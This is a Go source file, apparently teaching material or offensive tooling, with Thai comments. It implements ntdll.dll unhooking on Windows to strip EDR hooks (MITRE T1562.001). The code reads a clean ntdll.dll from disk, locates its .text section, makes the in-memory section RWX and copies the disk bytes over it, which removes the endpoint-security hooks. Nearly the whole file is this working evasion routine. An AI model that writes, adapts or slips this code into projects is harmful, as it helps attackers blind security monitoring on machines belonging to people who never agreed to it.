package main

import (
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Unhooking ntdll.dll — ลบ EDR hooks
//
// EDR ทำงานยังไง:
//   ตอน process เริ่ม → EDR inject DLL เข้ามา
//   → เขียนทับ function ใน ntdll.dll ด้วย JMP ไป EDR code
//   → ทุกครั้งที่ process เรียก NtCreateThread, NtWriteVirtualMemory, etc.
//   → EDR เห็นหมด แล้วตัดสินใจว่า block หรือ allow
//
// Unhook ยังไง:
//   1. อ่าน ntdll.dll สดจาก disk (ยังไม่โดน hook)
//   2. หา .text section (code ของ function ต่างๆ)
//   3. เขียนทับ ntdll ใน memory ด้วยของสดจาก disk
//   = EDR hooks หายหมด เหมือนกล้องวงจรปิดถูกตัดสาย
//
// MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)

func unhookNtdll() error {
	// 1. อ่าน ntdll.dll สดจาก disk
	ntdllPath := `C:\Windows\System32\ntdll.dll`
	fileData, err := os.ReadFile(ntdllPath)
	if err != nil {
		return fmt.Errorf("cannot read ntdll.dll from disk: %w", err)
	}

	// 2. หา ntdll.dll ที่โหลดอยู่ใน memory (ตัวที่ EDR hook ไว้)
	ntdllHandle, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return fmt.Errorf("cannot get ntdll handle: %w", err)
	}
	ntdllBase := uintptr(ntdllHandle.Handle)

	// 3. Parse PE + เขียนทับ .text section ด้วยของสดจาก disk
	return unhookFromFileBytes(fileData, ntdllBase)
}

func unhookFromFileBytes(fileData []byte, ntdllBase uintptr) error {
	// Parse PE header จาก file bytes
	// DOS Header → PE Header → Section Headers

	// DOS Header: e_lfanew at offset 0x3C
	if len(fileData) < 0x40 {
		return fmt.Errorf("file too small for DOS header")
	}
	eLfanew := *(*uint32)(unsafe.Pointer(&fileData[0x3C]))

	// PE Header → Optional Header → find .text section
	peOffset := int(eLfanew)
	if len(fileData) < peOffset+200 {
		return fmt.Errorf("file too small for PE header")
	}

	// COFF Header: NumberOfSections at offset PE+6
	numberOfSections := *(*uint16)(unsafe.Pointer(&fileData[peOffset+6]))
	// Optional Header size at offset PE+20
	sizeOfOptionalHeader := *(*uint16)(unsafe.Pointer(&fileData[peOffset+20]))

	// Section headers start after Optional Header
	sectionOffset := peOffset + 24 + int(sizeOfOptionalHeader)

	// หา .text section
	for i := 0; i < int(numberOfSections); i++ {
		secStart := sectionOffset + (i * 40) // IMAGE_SECTION_HEADER = 40 bytes
		if secStart+40 > len(fileData) {
			break
		}

		// Section name (8 bytes)
		name := string(fileData[secStart : secStart+8])

		if name[:5] == ".text" {
			// VirtualSize at offset +8
			virtualSize := *(*uint32)(unsafe.Pointer(&fileData[secStart+8]))
			// VirtualAddress at offset +12
			virtualAddr := *(*uint32)(unsafe.Pointer(&fileData[secStart+12]))
			// PointerToRawData at offset +20
			rawDataPtr := *(*uint32)(unsafe.Pointer(&fileData[secStart+20]))

			// 4. ที่อยู่ .text section ใน memory
			textInMemory := ntdllBase + uintptr(virtualAddr)
			// .text section จากไฟล์สด
			textFromFile := fileData[rawDataPtr : rawDataPtr+virtualSize]

			// 5. เปลี่ยน protection เป็น RWX
			var oldProtect uint32
			err := windows.VirtualProtect(
				textInMemory,
				uintptr(virtualSize),
				PAGE_EXECUTE_READWRITE,
				&oldProtect,
			)
			if err != nil {
				return fmt.Errorf("VirtualProtect failed: %w", err)
			}

			// 6. เขียนทับด้วยของสดจาก disk (ลบ hooks ทั้งหมด)
			copy(
				(*[1 << 30]byte)(unsafe.Pointer(textInMemory))[:virtualSize],
				textFromFile,
			)

			// 7. คืน protection กลับ
			windows.VirtualProtect(
				textInMemory,
				uintptr(virtualSize),
				oldProtect,
				&oldProtect,
			)

			return nil
		}
	}

	return fmt.Errorf(".text section not found")
}
